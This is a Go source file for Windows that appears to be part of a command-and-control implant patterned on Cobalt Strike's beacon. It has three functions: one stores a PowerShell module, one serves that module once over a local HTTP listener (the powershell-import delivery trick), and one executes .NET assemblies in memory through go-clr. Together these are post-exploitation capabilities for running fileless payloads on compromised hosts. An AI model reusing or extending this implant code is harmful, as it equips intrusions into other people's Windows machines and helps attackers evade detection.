//go:build windows

package command

import (
	"fmt"
	"github.com/Ne0nd0g/go-clr"
	"main/packet"
	"net"
	"strconv"
)

var powershellModule []byte

func PowershellImport(b []byte) {
	powershellModule = b
}

func WebDelivery(b []byte) {
	serverPort := packet.ReadShort(b)
	go func() {
		l, err := net.Listen("tcp", "127.0.0.1:"+strconv.Itoa(int(serverPort)))
		if err != nil {
			ErrorMessage(err.Error())
			return
		}
		defer l.Close()
		conn, err := l.Accept()
		if err != nil {
			fmt.Println("Error accepting: ", err)
			ErrorMessage(err.Error())
			return
		}
		defer conn.Close()
		httpHeader := fmt.Sprintf("HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: %d\r\n\r\n", len(powershellModule))
		receive := make([]byte, 256)
		_, _ = conn.Read(receive)
		_, _ = conn.Write([]byte(httpHeader))
		_, _ = conn.Write(powershellModule)
		_ = conn.Close()
	}()
}

func ExecAsm(b []byte) error {
	_, err := clr.ExecuteByteArray("v4.8", b, []string{})
	return err
}
